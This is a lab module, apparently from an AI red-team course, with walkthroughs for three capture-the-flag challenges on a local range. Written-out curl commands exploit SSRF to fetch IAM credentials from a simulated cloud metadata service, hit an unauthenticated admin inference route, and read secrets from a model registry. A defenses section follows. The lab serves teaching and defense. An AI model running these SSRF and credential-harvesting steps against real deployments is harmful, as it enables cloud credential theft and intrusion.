# Module 09 — AI Infrastructure & Deployment Exploits

> **Targets:** `appserver` + `metadata` + `drop`. **Maps to:** AI-300 Module 9 ·
> OWASP LLM03, LLM10 · MITRE ATLAS AML.T0040, AML.T0024.

## 1. Idea

Models run on ordinary — often over-privileged — infrastructure. A server-side
fetch primitive, an exposed inference port, or a leaky registry turns a model bug
into a cloud compromise. The `metadata` target stands in for the cloud instance
metadata service (169.254.169.254): reachable from inside the range, never from the
internet. The range's NetworkPolicies are part of the lesson — they are why SSRF to
the *internet* fails but SSRF to the *internal* metadata succeeds.

## 2. Start

```bash
redsec up 09
APP=http://127.0.0.1:9090
```

## 3. Walkthrough

### 3.1 `metadata-ssrf` — SSRF to credentials (LLM03)
`POST /fetch` fetches any URL **server-side** with no allow-list. The catch: the
URL must be reachable *from the appserver*, not from your laptop — so first do
recon to discover the internal metadata address, then SSRF to it. (This is why
pointing at your own `127.0.0.1` wouldn't work against a real deployment: inside
the appserver that's the appserver itself.)

```bash
# 1) recon: the appserver leaks its internal endpoints
META=$(curl -s $APP/debug/config | python3 -c 'import sys,json;print(json.load(sys.stdin)["internal_endpoints"]["metadata"])')
echo "internal metadata service: $META"
# 2) SSRF: make the appserver fetch the IMDS credentials for you
curl -s $APP/fetch -H 'content-type: application/json' \
  -d "{\"url\":\"$META/latest/meta-data/iam/security-credentials/role\"}"
redsec submit 09 metadata-ssrf 'REDSEC{...}'
```

### 3.2 `open-inference-api`
```bash
curl -s $APP/ | grep -o '/v1/[a-z]*'      # routes are advertised
curl -s $APP/v1/admin                       # no auth -> flag
redsec submit 09 open-inference-api 'REDSEC{...}'
```

### 3.3 `registry-secrets`
```bash
curl -s $APP/registry/models                        # ["initrode"]
curl -s $APP/registry/models/initrode/MLmodel        # secret in the model card
redsec submit 09 registry-secrets 'REDSEC{...}'
redsec down 09
```

## 4. Defenses

- **SSRF:** strict allow-lists for server-side fetches; block link-local/metadata
  ranges; require IMDSv2 / hop-limit; isolate egress (as this range does).
- **Inference APIs:** authenticate and rate-limit every route; never expose admin
  capabilities unauthenticated; watch for unbounded consumption (LLM10).
- **Registries:** scan model cards/configs/artifacts for secrets like code repos;
  use short-lived credentials and a secrets manager, never committed creds.
